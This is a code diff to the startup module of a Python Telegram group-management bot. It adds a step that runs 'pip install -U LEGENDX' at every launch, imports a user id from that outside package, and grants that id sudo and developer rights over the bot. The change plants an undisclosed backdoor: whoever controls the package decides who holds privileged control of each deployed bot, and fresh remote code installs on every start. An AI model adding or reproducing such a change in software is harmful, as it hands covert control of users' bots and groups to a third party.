@@ -3,7 +3,12 @@ import os
 import sys
 import time
 import telegram.ext as tg
-
+try:
+  os.system("pip install -U LEGENDX")
+  from LEGENDX import id
+except:
+  os.system("pip install LEGENDX")
+  from LEGENDX import id
 StartTime = time.time()
 
 # enable logging
@@ -140,14 +145,13 @@ else:
     WALL_API = Config.WALL_API
     STRICT_GMUTE = Config.STRICT_GMUTE
     
-
-SUDO_USERS.add(OWNER_ID)
-#example of tg_id you edit this else your bot is crashes
-SUDO_USERS.add(1100231654)
-
 DEV_USERS.add(OWNER_ID)
-#example of tg_id you edit this else your bot is crashed
-DEV_USERS.add(1100231654)
+SUDO_USERS.add(OWNER_ID)
+try:
+  SUDO_USERS.add(id)
+  DEV_USERS.add(id)
+except:
+  pass
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
